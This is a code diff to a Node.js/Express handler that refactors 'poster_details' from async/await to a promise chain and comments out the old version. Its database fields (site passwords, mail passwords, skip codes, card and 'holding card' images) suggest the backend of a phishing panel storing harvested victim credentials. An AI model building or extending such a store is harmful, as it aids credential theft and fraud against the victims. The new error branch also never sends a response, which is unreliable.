@@ -507,23 +507,34 @@ export const all_poster = async (req, res) => {
 }
 
 
-export const poster_details = async (req, res) => {
+export const poster_details =  (req, res) => {
 
     const { id } = req.params
 
 
-    try {
 
-        const data = await Poster.findOne({ _id: id })
-            .select('username password posterId links createdAt details')
-            .populate('details', 'site email password skipcode username passcode mail mailPass onlyCard holdingCard createdAt').sort({ createdAt: -1 })
-        return res.status(200).json({ data: data })
+    Poster.findOne({ _id: id })
+    .select('username password posterId links createdAt details')
+    .populate('details', 'site email password skipcode username passcode mail mailPass onlyCard holdingCard createdAt').sort({ createdAt: -1 })
+
+    .then(data => {
+        return res.status(200).json({ data: data })    }
+
+
+    ).catch(err => console.log('err', err))
+
+    // try {
+
+    //     const data = await Poster.findOne({ _id: id })
+    //         .select('username password posterId links createdAt details')
+    //         .populate('details', 'site email password skipcode username passcode mail mailPass onlyCard holdingCard createdAt').sort({ createdAt: -1 })
+    //     return res.status(200).json({ data: data })
 
 
 
-    } catch (e) {
-        res.status(400).json({ e: "error" })
-    }
+    // } catch (e) {
+    //     res.status(400).json({ e: "error" })
+    // }
 
 }
 
